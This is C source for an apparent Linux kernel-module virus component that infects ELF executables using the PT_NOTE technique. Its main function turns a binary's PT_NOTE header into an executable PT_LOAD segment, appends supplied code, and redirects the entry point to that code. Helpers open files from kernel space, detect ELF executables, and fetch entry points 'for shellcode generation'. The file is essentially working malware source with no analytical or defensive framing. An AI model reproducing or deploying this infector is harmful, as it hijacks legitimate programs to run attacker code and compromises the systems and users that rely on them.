#include "pt_note_infection.h"

struct file *kernel_open(char *pathname, int flags) {
    struct file *f = NULL;
    mm_segment_t oldfs;
    oldfs = get_fs();
    set_fs(KERNEL_DS);
    f = filp_open(pathname, flags, 0);
    set_fs(oldfs);
    if (IS_ERR(f)) {
        // pr_info("debug: failed to open (%s) with err (%d)\n", pathname, PTR_ERR(f));
        return NULL;
    }
    return f;
}

int pt_note_infect(struct file *f, void *code, size_t code_size) {
    if (!load_elf_phdrs_) {
        load_elf_phdrs_ = kallsyms_lookup_name_("load_elf_phdrs");
    }

    loff_t st_size = i_size_read(file_inode(f));

    loff_t pos = 0;
    struct elfhdr elf_ex;
    kernel_read(f, &elf_ex, sizeof(struct elfhdr), &pos);

    // find PT_NOTE segment
    struct elf_phdr *elf_phdata = load_elf_phdrs_(&elf_ex, f);
    struct elf_phdr *pt_note_phdr = NULL;
    int i = 0;
    for (i; i < elf_ex.e_phnum; i++) {
        if ((elf_phdata[i]).p_type == PT_NOTE) {
            pt_note_phdr = &elf_phdata[i];
            break;
        }
    }

    if (!pt_note_phdr) {
        return -1;
    }

    // change to PT_LOAD
    pt_note_phdr->p_type = PT_LOAD;
    pt_note_phdr->p_flags = PF_R | PF_X;
    pt_note_phdr->p_vaddr = 0xc000000; // some arbitrary high address
    pt_note_phdr->p_align = 0x200000;
    pt_note_phdr->p_filesz += code_size;
    pt_note_phdr->p_memsz += code_size;
    pt_note_phdr->p_offset = st_size;
    elf_ex.e_entry = pt_note_phdr->p_vaddr;

    // write back to file
    pos = 0;
    kernel_write(f, &elf_ex, sizeof(struct elfhdr), &pos);
    pos = elf_ex.e_phoff;
    kernel_write(f, elf_phdata, sizeof(struct elf_phdr) * elf_ex.e_phnum, &pos);
    pos = st_size;
    kernel_write(f, code, code_size, &pos);

    return 0;
}

int is_elf(struct file *f) {
    loff_t pos = 0;
    struct elfhdr elf_ex;
    kernel_read(f, &elf_ex, sizeof(struct elfhdr), &pos);
    // unclean
    return !(memcmp(elf_ex.e_ident, ELFMAG, SELFMAG) != 0);
}

int is_elf_exec(struct file *f) {
    loff_t pos = 0;
    struct elfhdr elf_ex;
    kernel_read(f, &elf_ex, sizeof(struct elfhdr), &pos);
    return (elf_ex.e_type == ET_EXEC);
}

// for shellcode generation
uintptr_t get_elf_entry(struct file *f) {
    loff_t pos = 0;
    struct elfhdr elf_ex;
    kernel_read(f, &elf_ex, sizeof(struct elfhdr), &pos);
    return elf_ex.e_entry;
}
